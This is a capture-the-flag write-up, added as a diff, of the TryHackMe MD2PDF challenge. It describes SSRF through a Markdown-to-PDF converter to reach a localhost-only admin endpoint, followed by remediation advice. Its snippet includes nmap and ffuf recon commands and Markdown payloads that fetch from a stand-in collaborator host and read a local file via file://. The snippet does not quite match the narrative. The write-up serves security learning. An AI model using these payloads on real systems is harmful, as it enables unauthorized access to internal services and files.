@@ -1,0 +1,89 @@
+# MD2PDF Challenge — TryHackMe (Challenge)
+**Date:** 2025-10-04  
+**Type:** Challenge  
+**Scope:** Lab / Authorized only
+
+---
+
+## 1) Context
+Exploit a Markdown→PDF web converter to reach internal functionality and retrieve the flag. Hypothesis: the converter fetches remote resources during rendering → potential **SSRF** path to localhost-only admin.
+
+## 2) Initial hypothesis
+If the renderer inlines external content (images/styles/HTML) server-side, referencing `http://127.0.0.1:<port>/...` from Markdown should coerce the server to request internal endpoints (admin/flag).
+
+## 3) Tools used
+- `nmap` (port discovery)  
+- `ffuf` (directory/vhost content)  
+- Browser + Markdown payloads (HTML/MD embeds)  
+- `curl` (sanity checks)
+
+## 4) Approach (high level)
+- Enumerate ports → identify secondary service.  
+- Fuzz web root for hidden paths.  
+- Confirm `/admin` exists but is localhost-only.  
+- Craft minimal Markdown embeds to coerce server-side fetch to `127.0.0.1:5000`.  
+- Iterate target path (`/admin` → `/flag`) inside the SSRF include.
+
+## 5) Results / Evidence (sanitized)
+- Open ports: **22, 80, 5000** (admin bound to **localhost:5000**).  
+- `/admin` on port 80 denies remote; SSRF via converter fetches `http://127.0.0.1:5000/admin`.  
+- Adjusted payload to correct port exposed internal content in the generated PDF; flag retrieved via `/flag`.  
+*(Final state: “internal endpoint fetched via SSRF during conversion”; no secrets beyond flag included.)*
+
+## 6) Recommended remediation
+- **Disallow remote fetches** during conversion (or proxy through strict allow-list).  
+- **Block loopback/metadata ranges** at application + network egress (127.0.0.0/8, ::1, link-local, cloud metadata).  
+- **Require absolute allow-listed hosts** for any fetch; resolve & compare IPs post-DNS (canonicalization).  
+- **Run converters in a sandbox** with no network egress; strip HTML if only Markdown is intended.  
+- Consistent **HTTP→HTTPS** policy and unified auth across ports; avoid exposing admin on alternate ports bound only to localhost if server-side fetchers exist.
+
+## 7) Lessons learned
+- File converters often perform **server-side fetches** → classic SSRF sink.  
+- **Port accuracy matters**: `:5000` was the key detail.  
+- **Client vs server inclusion**: iframes show nothing to *you*, but the *server* may still fetch on render.  
+- Minimal, targeted payloads accelerate validation.
+
+## 8) Links / Resources
+- SecLists (wordlists)  
+- Nmap Reference Guide (host/port discovery)  
+- Write-up notes (public)
+
+## 9) Snippet
+**Snippet**
+```
+# 1) Port sweep
+sudo nmap -sS -p- -T4 10.10.127.167
+
+# 2) Find hidden paths (ffuf)
+ffuf -u http://10.10.127.167/FUZZ \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
+  -fs 2660 -s
+
+# 3) Minimal SSRF via Markdown image (server-side fetch)
+# Create a markdown file that references an external URL (OOB collector)
+cat > ssrf.md <<'MD'
+![ssrf](https://YOURCOLLABORATOR_DOMAIN/)
+MD
+
+# 4) Target the flag directly (try common file paths — replace with likely paths)
+# Note: many converters will try to fetch file:// URIs or resolve local paths — adjust to lab layout
+cat > flag.md <<'MD'
+![flag](file:///path/to/flag.txt)
+MD
+
+# 5) Upload to the Markdown → PDF converter (example using curl; replace CONVERTER_URL)
+# (If the converter is a web form, adapte le champ name / endpoint)
+curl -F "file=@ssrf.md"    https://CONVERTER_URL/upload -o ssrf.pdf
+curl -F "file=@flag.md"    https://CONVERTER_URL/upload -o flag.pdf
+
+# 6) Read the generated PDF locally (extract text)
+pdftotext ssrf.pdf - | sed -n '1,200p'
+pdftotext flag.pdf - | sed -n '1,200p'
+
+# Alternative: open the PDF in a viewer
+# xdg-open ssrf.pdf   # Linux desktop
+# open ssrf.pdf       # macOS
+
+# Quick note: if you need an OOB listener for SSRF, use Burp Collaborator / RequestBin / a self-hosted HTTP server:
+# python3 -m http.server 8080    # quick ephemeral server (labs only)
+```
